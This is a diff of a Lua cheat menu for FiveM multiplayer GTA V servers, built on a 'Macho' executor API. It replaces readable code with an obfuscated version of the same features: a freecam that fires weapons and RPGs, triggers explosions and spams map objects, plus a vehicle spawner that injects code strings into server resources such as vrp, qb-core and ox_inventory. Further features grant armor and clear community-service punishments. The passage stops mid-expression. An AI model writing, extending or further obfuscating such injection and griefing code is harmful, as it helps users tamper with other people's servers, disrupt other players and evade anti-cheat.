-        RenderScriptCams(true, false, 200, false, false)
-        
-        SetEntityVisible(PlayerPedId(), false, false)
-        FreezeEntityPosition(PlayerPedId(), true)
-    else
-        if cam then
-            SetCamActive(cam, false)
-            RenderScriptCams(false, true, 0, false, false)
-            DestroyCam(cam)
-            cam = nil
-        end
-        ClearFocus()
-        SetFocusEntity(PlayerPedId())
-        SetEntityVisible(PlayerPedId(), true, false)
-        FreezeEntityPosition(PlayerPedId(), false)
-        NetworkSetFriendlyFireOption(true)
-        SetCanAttackFriendly(PlayerPedId(), true, true)
-        EnableAllControlActions(0)
-        EnableAllControlActions(1)
-    end
-end
-
-function CloseFreeCam()
-    if cam_active and cam then
-        cam_active = false
-        SetCamActive(cam, false)
-        RenderScriptCams(false, true, 0, false, false)
-        DestroyCam(cam)
-        cam = nil
-        ClearFocus()
-        SetFocusEntity(PlayerPedId())
-        SetEntityVisible(PlayerPedId(), true, false)
-        FreezeEntityPosition(PlayerPedId(), false)
-        NetworkSetFriendlyFireOption(true)
-        SetCanAttackFriendly(PlayerPedId(), true, true)
-        EnableAllControlActions(0)
-        EnableAllControlActions(1)
-    end
-end
-
-function draw_center_dot()
-    local res_x, res_y = GetActiveScreenResolution()
-    DrawRect(0.5, 0.5, 2.0 / res_x, 2.0 / res_y, 255, 255, 255, 255)
-end
-
-function draw_freecam_circle()
-    local segments = 80
-    local radius = 0.6
-    local centerX = 0.5
-    local centerY = 0.5
-    local step = (2.0 * math.pi) / segments
-    local prevX = centerX + radius
-    local prevY = centerY
-
-    for i = 1, segments do
-        local angle = i * step
-        local newX = centerX + radius * math.cos(angle)
-        local newY = centerY + radius * math.sin(angle)
-        DrawLine(prevX, prevY, 0.0, newX, newY, 0.0, 255, 255, 255, 180)
-        prevX = newX
-        prevY = newY
-    end
-end
-
--- ============================================================
--- WEAPON SHOT FUNCTION (Keeps weapon on you)
--- ============================================================
-
-local function FireWeaponAtTarget(coords, dir, weaponName)
-    local weaponHash = GetHashKey(weaponName)
-    local playerPed = PlayerPedId()
-    
-    local hasWeapon = HasPedGotWeapon(playerPed, weaponHash, false)
-    
-    RequestWeaponAsset(weaponHash, 31, 0)
-    local timeout = 0
-    while not HasWeaponAssetLoaded(weaponHash) and timeout < 100 do
-        Wait(10)
-        timeout = timeout + 1
-    end
-    
-    if HasWeaponAssetLoaded(weaponHash) then
-        if not hasWeapon then
-            GiveWeaponToPed(playerPed, weaponHash, 999, false, true)
-        end
-        
-        SetCurrentPedWeapon(playerPed, weaponHash, true)
-        Citizen.Wait(0)
-        
-        local endCoords = coords + dir * 500.0
-        
-        ShootSingleBulletBetweenCoords(
-            coords.x, coords.y, coords.z,
-            endCoords.x, endCoords.y, endCoords.z,
-            100, true, weaponHash, playerPed, true, false, 1000.0
-        )
-        
-        return true
-    end
-    return false
-end
-
--- ============================================================
--- SPAWN VEHICLE WITH MONITOR METHOD (VRP + QB-Core)
--- ============================================================
-
-local function SpawnVehicleWithMonitor(coords, dir, modelName)
-    local targetResource = nil
-    if GetResourceState('vrp') == "started" then
-        targetResource = 'vrp'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    elseif GetResourceState('ox_inventory') == "started" then
-        targetResource = 'ox_inventory'
-    else
-        targetResource = 'monitor'
-    end
-    
-    MachoInjectResource(targetResource, string.format([[
+    ]]);DestroyCamera();break;end end end);Citizen.CreateThread(function() while true do local v499=0 -0 ;while true do if (v499==(1369 -(34 + 1334))) then if v49 then local v869=GetCamCoord(v51);local v870=GetCamRot(v51,1 + 1 );local v871=math.rad(v870.z);local v872=v53;if IsControlPressed(0 + 0 ,1316 -(1035 + 248) ) then v869=v869 + vector3(v872 * math.sin(v871) ,v872 *  -math.cos(v871) ,21 -(20 + 1) ) ;end if IsControlPressed(0 + 0 ,32) then v869=v869 + vector3( -v872 * math.sin(v871) , -v872 *  -math.cos(v871) ,319 -(134 + 185) ) ;end if IsControlPressed(1133 -(549 + 584) ,720 -(314 + 371) ) then v869=v869 + vector3(v872 * math.cos(v871) ,v872 * math.sin(v871) ,0) ;end if IsControlPressed(0 -0 ,1002 -(478 + 490) ) then v869=v869 + vector3( -v872 * math.cos(v871) , -v872 * math.sin(v871) ,0) ;end if IsControlPressed(0 + 0 ,44) then v869=v869 + vector3(0,1172 -(786 + 386) ,v872) ;end if IsControlPressed(0 -0 ,1417 -(1055 + 324) ) then v869=v869 + vector3(0,1340 -(1093 + 247) , -v872) ;end SetCamCoord(v51,v869.x,v869.y,v869.z);local v873=GetDisabledControlNormal(0 + 0 ,1 + 0 ) * 0.25 ;local v874=GetDisabledControlNormal(0 -0 ,6 -4 ) *  -0.25 ;local v875=math.max( -(252 -163),math.min(223 -134 ,newCamRotX));local v876=v870.z-(v873 * v872) ;v875=math.max( -(32 + 57),math.min(342 -253 ,v875));SetCamRot(v51,v875,0,v876,6 -4 );if  not IsEntityPlayingAnim(v21,v23,v24,3 + 0 ) then TaskPlayAnim(v21,v23,v24,8, -(20 -12), -1,737 -(364 + 324) ,0 -0 ,false,false,false);end if  not IsPedRagdoll(v21) then SetPedToRagdoll(v21,1000,1000,0 -0 ,true,true,false);end end break;end if (v499==(0 + 0)) then Citizen.Wait(0 -0 );v21=PlayerPedId();v499=1;end end end end);local v54=false;local v55=nil;local v56=false;local v57=nil;local v58={"Select","Teleportation","Weapon Shot","RPG","Explosion","Shoot Car","Shoot Boat","Shoot Plane","Map Destroy"};local v59=1;local v60={"WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG","WEAPON_COMBATPDW","WEAPON_MACHINEPISTOL","WEAPON_MINISMG","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_MARKSMANRIFLE","WEAPON_MINIGUN","WEAPON_GRENADELAUNCHER","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_RAILGUN","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_SMOKEGRENADE","WEAPON_BZGAS","WEAPON_MOLOTOV","WEAPON_PETROLCAN","WEAPON_FLARE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_PIPEBOMB"};local v61=1;local v62={"adder","zentorno","t20","nero","fmj","sultan","kuruma2","entityxf","osiris","reaper"};local v63={"dinghy","jetmax","suntrap","tropic","seashark","squalo","marquis","predator"};local v64={"lazer","hydra","besra","vestra","nimbus","shamal","duster","mammatus","velum","stunt"};local v65=1;local v66=2 -1 ;local v67=1 + 0 ;local v68={"prop_loopile_06","dt1_05_build1_damage","hei_dt1_tcmodzito","sum_prop_dufocore_01a","sr_prop_stunt_tube_xs_02a","xs_propint2_set_scifi_10","prop_crate_02a","xs_prop_arena_turret_01a_wl","xs_prop_arena_podium_02a","prop_air_bigradar","xs_prop_arena_barrel_01a_sf","prop_church_01","prop_cs_crane_arm","xs_prop_arena_turntable_01a_wl","prop_cstl_twr_b","prop_skid_tent_01","xs_prop_hamburgher_wl","prop_container_01a","prop_contnr_pile_01a","stt_prop_stunt_track_start","stt_prop_stunt_track_dwuturn","xs_prop_arena_podium_02a","prop_rock_1_b","xs_prop_arena_barrel_01a_sf","prop_rock_4_b","stt_prop_stunt_tube_fn_05","csx_seabedrock3","hei_prop_carrier_jet","prop_windmill_01","dt1_02_build1_damage","p_oil_pjack_01_amo","stt_prop_stunt_tube_l","xs_terrain_dyst_ground_07","prop_tyre_9","prop_tree_01","prop_tree_02","stt_prop_stunt_tube_fn_02"};local v69=1119 -(628 + 490) ;function RotationToDirection(v246) local v247=0 + 0 ;local v248;local v249;local v250;while true do if (v247==(0 -0)) then v248=math.rad(v246.z);v249=math.rad(v246.x);v247=1;end if (v247==1) then v250=math.cos(v249);return vector3( -math.sin(v248) * v250 ,math.cos(v248) * v250 ,math.sin(v249));end end end function ToggleFreeCam() local v251=0;while true do if (v251==0) then v54= not v54;if v54 then local v810=GetGameplayCamCoord();local v811=GetGameplayCamRot();v55=CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA",v810.x,v810.y,v810.z,v811.x,v811.y,v811.z,228 -178 );SetCamActive(v55,true);RenderScriptCams(true,false,200,false,false);SetEntityVisible(PlayerPedId(),false,false);FreezeEntityPosition(PlayerPedId(),true);else local v812=774 -(431 + 343) ;while true do if (v812==1) then SetFocusEntity(PlayerPedId());SetEntityVisible(PlayerPedId(),true,false);v812=2;end if (v812==(0 -0)) then if v55 then local v956=0;while true do if (v956==0) then SetCamActive(v55,false);RenderScriptCams(false,true,0 -0 ,false,false);v956=1 + 0 ;end if (v956==1) then DestroyCam(v55);v55=nil;break;end end end ClearFocus();v812=1 + 0 ;end if (v812==(1697 -(556 + 1139))) then FreezeEntityPosition(PlayerPedId(),false);NetworkSetFriendlyFireOption(true);v812=18 -(6 + 9) ;end if (v812==(1 + 3)) then EnableAllControlActions(1 + 0 );break;end if (v812==(172 -(28 + 141))) then SetCanAttackFriendly(PlayerPedId(),true,true);EnableAllControlActions(0 + 0 );v812=4;end end end break;end end end function CloseFreeCam() if (v54 and v55) then v54=false;SetCamActive(v55,false);RenderScriptCams(false,true,0,false,false);DestroyCam(v55);v55=nil;ClearFocus();SetFocusEntity(PlayerPedId());SetEntityVisible(PlayerPedId(),true,false);FreezeEntityPosition(PlayerPedId(),false);NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);EnableAllControlActions(0);EnableAllControlActions(1 -0 );end end function draw_center_dot() local v252=0 + 0 ;local v253;local v254;while true do if (0==v252) then v253,v254=GetActiveScreenResolution();DrawRect(1317.5 -(486 + 831) ,0.5,(5 -3)/v253 ,(6 -4)/v254 ,255,49 + 206 ,806 -551 ,1518 -(668 + 595) );break;end end end function draw_freecam_circle() local v255=0 + 0 ;local v256;local v257;local v258;local v259;local v260;local v261;local v262;while true do if (v255==(1 + 0)) then v258=0.5 -0 ;v259=290.5 -(23 + 267) ;v255=1946 -(1129 + 815) ;end if (v255==2) then v260=((389 -(371 + 16)) * math.pi)/v256 ;v261=v258 + v257 ;v255=1753 -(1326 + 424) ;end if (v255==(0 -0)) then v256=80;v257=0.6;v255=3 -2 ;end if (v255==(121 -(88 + 30))) then v262=v259;for v773=772 -(720 + 51) ,v256 do local v774=0;local v775;local v776;local v777;while true do if (v774==1) then v777=v259 + (v257 * math.sin(v775)) ;DrawLine(v261,v262,0,v776,v777,0,567 -312 ,2031 -(421 + 1355) ,420 -165 ,89 + 91 );v774=2;end if ((1085 -(286 + 797))==v774) then v261=v776;v262=v777;break;end if (v774==(0 -0)) then v775=v773 * v260 ;v776=v258 + (v257 * math.cos(v775)) ;v774=1;end end end break;end end end local function v70(v263,v264,v265) local v266=0;local v267;local v268;local v269;local v270;while true do if (v266==(4 -1)) then if HasWeaponAssetLoaded(v267) then if  not v269 then GiveWeaponToPed(v268,v267,1438 -(397 + 42) ,false,true);end SetCurrentPedWeapon(v268,v267,true);Citizen.Wait(0 + 0 );local v813=v263 + (v264 * (1300 -(24 + 776))) ;ShootSingleBulletBetweenCoords(v263.x,v263.y,v263.z,v813.x,v813.y,v813.z,154 -54 ,true,v267,v268,true,false,1000);return true;end return false;end if ((787 -(222 + 563))==v266) then v270=0 -0 ;while  not HasWeaponAssetLoaded(v267) and (v270<(72 + 28))  do local v778=190 -(23 + 167) ;while true do if (v778==(1798 -(690 + 1108))) then Wait(4 + 6 );v270=v270 + 1 ;break;end end end v266=3 + 0 ;end if ((849 -(40 + 808))==v266) then v269=HasPedGotWeapon(v268,v267,false);RequestWeaponAsset(v267,31,0 + 0 );v266=7 -5 ;end if (v266==(0 + 0)) then v267=GetHashKey(v265);v268=PlayerPedId();v266=1 + 0 ;end end end local function v71(v271,v272,v273) local v274=0 + 0 ;local v275;while true do if (v274==(572 -(47 + 524))) then MachoInjectResource(v275,string.format([[
         local vehicleModel = "%s"
         local spawnX = %f
         local spawnY = %f
@@ -1332,390 +184,9 @@ local function SpawnVehicleWithMonitor(coords, dir, modelName)
         else
             TriggerEvent('chat:addMessage', { args = { '^1Freecam:', 'Failed to spawn ' .. vehicleModel } })
         end
-    ]], modelName, coords.x, coords.y, coords.z, dir.x, dir.y, dir.z))
-    
-    MachoMenuNotification("Freecam", "Spawning: " .. modelName)
-end
-
--- ============================================================
--- MAP DESTROY FUNCTION
--- ============================================================
-
-local function MapDestroySingle(coords, objModel)
-    local hash = GetHashKey(objModel)
-    RequestModel(hash)
-    local timeout = 0
-    while not HasModelLoaded(hash) and timeout < 50 do
-        Wait(10)
-        timeout = timeout + 1
-    end
-    
-    if HasModelLoaded(hash) then
-        local angle = math.random() * 2 * math.pi
-        local radius = math.random(5, 25)
-        local x = coords.x + math.cos(angle) * radius
-        local y = coords.y + math.sin(angle) * radius
-        local z = coords.z + math.random(0, 15)
-        
-        local obj = CreateObject(hash, x, y, z, true, true, true)
-        if DoesEntityExist(obj) then
-            SetEntityAsMissionEntity(obj, true, true)
-            SetEntityCollision(obj, true, true)
-            SetEntityVelocity(obj, math.random(-10, 10), math.random(-10, 10), math.random(15, 50))
-            SetModelAsNoLongerNeeded(hash)
-            return obj
-        end
-        SetModelAsNoLongerNeeded(hash)
-    end
-    return nil
-end
-
--- ============================================================
--- MAIN FREECAM THREAD
--- ============================================================
-
-Citizen.CreateThread(function()
-    while true do
-        Citizen.Wait(0)
-
-        if IsControlJustPressed(0, 74) then -- Page Up
-            if isFreeCamEnabled then
-                NetworkSetFriendlyFireOption(true)
-                SetCanAttackFriendly(PlayerPedId(), true, true)
-                EnableAllControlActions(0)
-                EnableAllControlActions(1)
-                ToggleFreeCam()
-            end
-        end
-
-        if not isFreeCamEnabled and cam_active then
-            CloseFreeCam()
-        end
-
-        if cam_active and cam then
-            local coords = GetCamCoord(cam)
-            local rot = GetCamRot(cam)
-            local dir = RotationToDirection(rot)
-
-            local shift = IsControlPressed(0, 21)
-            local speed = shift and 5.0 or 0.5
-
-            if IsControlPressed(0, 32) then -- W
-                coords = coords + dir * speed
-            elseif IsControlPressed(0, 33) then -- S
-                coords = coords - dir * speed
-            end
-            if IsControlPressed(0, 34) then -- A
-                coords = coords + vector3(-dir.y, dir.x, 0.0) * speed
-            elseif IsControlPressed(0, 35) then -- D
-                coords = coords + vector3(dir.y, -dir.x, 0.0) * speed
-            end
-            SetCamCoord(cam, coords.x, coords.y, coords.z)
-
-            local h_move = GetControlNormal(0, 1) * 4
-            local v_move = GetControlNormal(0, 2) * 4
-            if h_move ~= 0.0 or v_move ~= 0.0 then
-                SetCamRot(cam, rot.x - v_move, rot.y, rot.z - h_move)
-            end
-
-            TaskStandStill(PlayerPedId(), 10)
-            SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
-
-            local handle = StartExpensiveSynchronousShapeTestLosProbe(
-                coords.x, coords.y, coords.z,
-                coords.x + dir.x * 500.0,
-                coords.y + dir.y * 500.0,
-                coords.z + dir.z * 500.0,
-                -1, PlayerPedId()
-            )
-            local _, hit, end_coords, _, entityHit = GetShapeTestResult(handle)
-
-            -- Feature switching with Q/E
-            if IsControlJustPressed(0, 44) then -- Q
-                current_feature = current_feature - 1
-                if current_feature < 1 then current_feature = #Features end
-                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-            end
-            
-            if IsControlJustPressed(0, 38) then -- E
-                current_feature = current_feature + 1
-                if current_feature > #Features then current_feature = 1 end
-                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-            end
-
-            -- Sub-feature switching with Arrow Keys
-            local feature = Features[current_feature]
-            
-            if feature == "Weapon Shot" then
-                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
-                    currentWeaponIndex = currentWeaponIndex - 1
-                    if currentWeaponIndex < 1 then currentWeaponIndex = #Weapons end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
-                    currentWeaponIndex = currentWeaponIndex + 1
-                    if currentWeaponIndex > #Weapons then currentWeaponIndex = 1 end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                
-            elseif feature == "Shoot Car" then
-                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
-                    currentCarIndex = currentCarIndex - 1
-                    if currentCarIndex < 1 then currentCarIndex = #CarModels end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
-                    currentCarIndex = currentCarIndex + 1
-                    if currentCarIndex > #CarModels then currentCarIndex = 1 end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                
-            elseif feature == "Shoot Boat" then
-                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
-                    currentBoatIndex = currentBoatIndex - 1
-                    if currentBoatIndex < 1 then currentBoatIndex = #BoatModels end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
-                    currentBoatIndex = currentBoatIndex + 1
-                    if currentBoatIndex > #BoatModels then currentBoatIndex = 1 end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                
-            elseif feature == "Shoot Plane" then
-                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
-                    currentPlaneIndex = currentPlaneIndex - 1
-                    if currentPlaneIndex < 1 then currentPlaneIndex = #PlaneModels end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
-                    currentPlaneIndex = currentPlaneIndex + 1
-                    if currentPlaneIndex > #PlaneModels then currentPlaneIndex = 1 end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                
-            elseif feature == "Map Destroy" then
-                if IsControlJustPressed(0, 174) or IsControlJustPressed(0, 241) then -- Left Arrow
-                    currentMapIndex = currentMapIndex - 1
-                    if currentMapIndex < 1 then currentMapIndex = #MapDestroyObjects end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-                if IsControlJustPressed(0, 175) or IsControlJustPressed(0, 242) then -- Right Arrow
-                    currentMapIndex = currentMapIndex + 1
-                    if currentMapIndex > #MapDestroyObjects then currentMapIndex = 1 end
-                    PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
-                end
-            end
-
-            -- ============================================================
-            -- DRAW UI - BIGGER TEXT (Scale 0.8 for bigger text)
-            -- ============================================================
-            SetTextFont(4)
-            SetTextProportional(1)
-            SetTextScale(0.0, 0.8)  -- BIGGER TEXT (was 0.425)
-            SetTextColour(0, 255, 255, 255)
-            SetTextOutline()
-            SetTextCentre(true)
-            SetTextEntry("STRING")
-            
-            -- Show current selection
-            local displayText = "[" .. Features[current_feature] .. "]"
-            if feature == "Weapon Shot" then
-                local weaponName = Weapons[currentWeaponIndex]
-                local displayName = GetLabelText(weaponName)
-                if displayName == "NULL" or displayName == "" then
-                    displayName = weaponName:gsub("WEAPON_", "")
-                end
-                displayText = "[Weapon Shot: " .. displayName .. "]"
-            elseif feature == "Shoot Car" then
-                displayText = "[Shoot Car: " .. CarModels[currentCarIndex] .. "]"
-            elseif feature == "Shoot Boat" then
-                displayText = "[Shoot Boat: " .. BoatModels[currentBoatIndex] .. "]"
-            elseif feature == "Shoot Plane" then
-                displayText = "[Shoot Plane: " .. PlaneModels[currentPlaneIndex] .. "]"
-            elseif feature == "Map Destroy" then
-                displayText = "[Map Destroy: " .. MapDestroyObjects[currentMapIndex] .. "]"
-            end
-            
-            AddTextComponentString(displayText)
-            DrawText(0.5, 0.90)  -- Slightly higher position
-
-            draw_center_dot()
-            draw_freecam_circle()
-
-            -- Execute feature on Left Click
-            if IsDisabledControlJustPressed(0, 24) then
-                if feature == "Select" then
-                    if hit and entityHit and entityHit ~= 0 then
-                        local entityType = GetEntityType(entityHit)
-                        local typeName = entityType == 1 and "Ped" or entityType == 2 and "Vehicle" or entityType == 3 and "Object" or "Unknown"
-                        MachoMenuNotification("Freecam", "Selected: " .. typeName)
-                    end
-                    
-                elseif feature == "Teleportation" then
-                    if hit then
-                        TeleportMarkerCoords = end_coords 
-                    end
-                    if TeleportMarkerCoords ~= nil then
-                        local playerPed = PlayerPedId()
-                        local vehicle = GetVehiclePedIsIn(playerPed, false)
-                        local coords = TeleportMarkerCoords
-
-                        if vehicle and vehicle ~= 0 then
-                            SetEntityCoords(vehicle, coords.x, coords.y, coords.z + 2.0, false, false, false, false)
-                        else
-                            SetEntityCoords(playerPed, coords.x, coords.y, coords.z + 1.0, false, false, false, false)
-                        end
-                
-                        TeleportMarkerCoords = nil
-                        MachoMenuNotification("Freecam", "Teleported!")
-                    end
-                    
-                elseif feature == "Weapon Shot" then
-                    if hit then
-                        local weaponName = Weapons[currentWeaponIndex]
-                        local success = FireWeaponAtTarget(coords, dir, weaponName)
-                        if success then
-                            MachoMenuNotification("Freecam", "Fired: " .. weaponName)
-                        else
-                            MachoMenuNotification("Freecam", "Failed to fire weapon")
-                        end
-                    end
-                    
-                elseif feature == "RPG" then
-                    if hit then
-                        local weaponHash = GetHashKey("WEAPON_RPG")
-                        RequestWeaponAsset(weaponHash, 31, 0)
-                        while not HasWeaponAssetLoaded(weaponHash) do Wait(0) end
-                
-                        ShootSingleBulletBetweenCoords(
-                            coords.x, coords.y, coords.z,
-                            end_coords.x, end_coords.y, end_coords.z,
-                            100, true, weaponHash, PlayerPedId(), true, false, 1000.0
-                        )
-                        MachoMenuNotification("Freecam", "RPG Fired!")
-                    end
-                    
-                elseif feature == "Explosion" then
-                    if hit then
-                        AddExplosion(end_coords.x, end_coords.y, end_coords.z, 7, 50.0, true, false, 1.0)
-                        MachoMenuNotification("Freecam", "Explosion!")
-                    end
-                    
-                elseif feature == "Shoot Car" then
-                    if hit then
-                        SpawnVehicleWithMonitor(coords, dir, CarModels[currentCarIndex])
-                    end
-                    
-                elseif feature == "Shoot Boat" then
-                    if hit then
-                        SpawnVehicleWithMonitor(coords, dir, BoatModels[currentBoatIndex])
-                    end
-                    
-                elseif feature == "Shoot Plane" then
-                    if hit then
-                        SpawnVehicleWithMonitor(coords, dir, PlaneModels[currentPlaneIndex])
-                    end
-                    
-                elseif feature == "Map Destroy" then
-                    if hit then
-                        local obj = MapDestroySingle(end_coords, MapDestroyObjects[currentMapIndex])
-                        if obj then
-                            MachoMenuNotification("Freecam", "Spawned: " .. MapDestroyObjects[currentMapIndex])
-                        end
-                    end
-                end
-            end
-        end
-    end
-end)
-
--- S1DEV VRP Freecam Menu Checkbox
-MachoMenuCheckbox(FirstSection, "S1DEV Freecam - Safe", function()
-    isFreeCamEnabled = true
-    if not cam_active then
-        ToggleFreeCam()
-    end
-end, function()
-    isFreeCamEnabled = false
-    CloseFreeCam()
-end)
-
-MachoMenuButton(FirstSection, "Close Menu", function()
-    menu = 0 
-    MachoMenuDestroy(MenuWindow)
-end)
-
--- Animation Cancel System
-MachoMenuButton(FirstSection, "Animation Cancel On/Off", function()
-    animCancel = not animCancel
-
-    if animCancel then
-        print("Animation cancel ACTIVE - X key")
-    else
-        print("Animation cancel OFF")
-    end
-end)
-
--- X key listener
-CreateThread(function()
-    while true do
-        Wait(0)
-        if animCancel and IsControlJustPressed(0, 73) then -- 73 = X
-            ClearPedTasksImmediately(PlayerPedId())
-        end
-    end
-end)
-
-MachoMenuButton(FirstSection, "Armor - Safe", function()
-    local playerPed = PlayerPedId()
-    SetPedArmour(playerPed, 100)
-    MachoMenuNotification("S1DEV", "Armor applied.")
-end)
-
-MachoMenuButton(FirstSection, "Clear Community Service (Safe)", function()
-    MachoInjectResource("any", [[
+    ]],v273,v271.x,v271.y,v271.z,v272.x,v272.y,v272.z));MachoMenuNotification("Freecam","Spawning: "   .. v273 );break;end if (v274==(0 + 0)) then v275=nil;if (GetResourceState("vrp")=="started") then v275="vrp";elseif (GetResourceState("qb-core")=="started") then v275="qb-core";elseif (GetResourceState("ox_inventory")=="started") then v275="ox_inventory";else v275="monitor";end v274=1;end end end local function v72(v276,v277) local v278=GetHashKey(v277);RequestModel(v278);local v279=0 -0 ;while  not HasModelLoaded(v278) and (v279<(74 -24))  do local v500=0 -0 ;while true do if (v500==0) then Wait(1736 -(1165 + 561) );v279=v279 + 1 + 0 ;break;end end end if HasModelLoaded(v278) then local v528=0 -0 ;local v529;local v530;local v531;local v532;local v533;local v534;while true do if (v528==(2 + 1)) then if DoesEntityExist(v534) then local v925=0;while true do if (v925==1) then SetEntityVelocity(v534,math.random( -(489 -(341 + 138)),3 + 7 ),math.random( -(20 -10),336 -(89 + 237) ),math.random(15,160 -110 ));SetModelAsNoLongerNeeded(v278);v925=3 -1 ;end if (2==v925) then return v534;end if (v925==(881 -(581 + 300))) then SetEntityAsMissionEntity(v534,true,true);SetEntityCollision(v534,true,true);v925=1221 -(855 + 365) ;end end end SetModelAsNoLongerNeeded(v278);break;end if (v528==(4 -2)) then v533=v276.z + math.random(0,15) ;v534=CreateObject(v278,v531,v532,v533,true,true,true);v528=1 + 2 ;end if (v528==(1235 -(1030 + 205))) then v529=math.random() * (2 + 0) * math.pi ;v530=math.random(5,24 + 1 );v528=287 -(156 + 130) ;end if (v528==(2 -1)) then v531=v276.x + (math.cos(v529) * v530) ;v532=v276.y + (math.sin(v529) * v530) ;v528=2;end end end return nil;end Citizen.CreateThread(function() while true do Citizen.Wait(0);if IsControlJustPressed(0,124 -50 ) then if v56 then local v814=0 -0 ;while true do if (1==v814) then EnableAllControlActions(0);EnableAllControlActions(1 + 0 );v814=2;end if (v814==(0 + 0)) then NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);v814=70 -(10 + 59) ;end if (v814==(1 + 1)) then ToggleFreeCam();break;end end end end if ( not v56 and v54) then CloseFreeCam();end if (v54 and v55) then local v708=GetCamCoord(v55);local v709=GetCamRot(v55);local v710=RotationToDirection(v709);local v711=IsControlPressed(0 -0 ,1184 -(671 + 492) );local v712=(v711 and (4 + 1)) or (1215.5 -(369 + 846)) ;if IsControlPressed(0,32) then v708=v708 + (v710 * v712) ;elseif IsControlPressed(0 + 0 ,29 + 4 ) then v708=v708-(v710 * v712) ;end if IsControlPressed(0,34) then v708=v708 + (vector3( -v710.y,v710.x,1945 -(1036 + 909) ) * v712) ;elseif IsControlPressed(0 + 0 ,35) then v708=v708 + (vector3(v710.y, -v710.x,0) * v712) ;end SetCamCoord(v55,v708.x,v708.y,v708.z);local v713=GetControlNormal(0 -0 ,204 -(11 + 192) ) * (3 + 1) ;local v714=GetControlNormal(175 -(135 + 40) ,4 -2 ) * 4 ;if ((v713~=(0 + 0)) or (v714~=(0 -0))) then SetCamRot(v55,v709.x-v714 ,v709.y,v709.z-v713 );end TaskStandStill(PlayerPedId(),14 -4 );SetFocusPosAndVel(v708.x,v708.y,v708.z,176 -(50 + 126) ,0,0);local v715=StartExpensiveSynchronousShapeTestLosProbe(v708.x,v708.y,v708.z,v708.x + (v710.x * 500) ,v708.y + (v710.y * 500) ,v708.z + (v710.z * (1392 -892)) , -(1 + 0),PlayerPedId());local v716,v717,v718,v716,v719=GetShapeTestResult(v715);if IsControlJustPressed(1413 -(1233 + 180) ,44) then local v815=0;while true do if (v815==(969 -(522 + 447))) then v59=v59-1 ;if (v59<(1422 -(107 + 1314))) then v59= #v58;end v815=1 + 0 ;end if (v815==(2 -1)) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if IsControlJustPressed(0 -0 ,38) then v59=v59 + 1 ;if (v59> #v58) then v59=3 -2 ;end PlaySoundFrontend( -(1911 -(716 + 1194)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end local v720=v58[v59];if (v720=="Weapon Shot") then local v816=0 + 0 ;while true do if (v816==(0 + 0)) then if (IsControlJustPressed(503 -(74 + 429) ,335 -161 ) or IsControlJustPressed(0 + 0 ,551 -310 )) then v61=v61-1 ;if (v61<1) then v61= #v60;end PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(0,175) or IsControlJustPressed(0 -0 ,597 -355 )) then v61=v61 + 1 ;if (v61> #v60) then v61=434 -(279 + 154) ;end PlaySoundFrontend( -(779 -(454 + 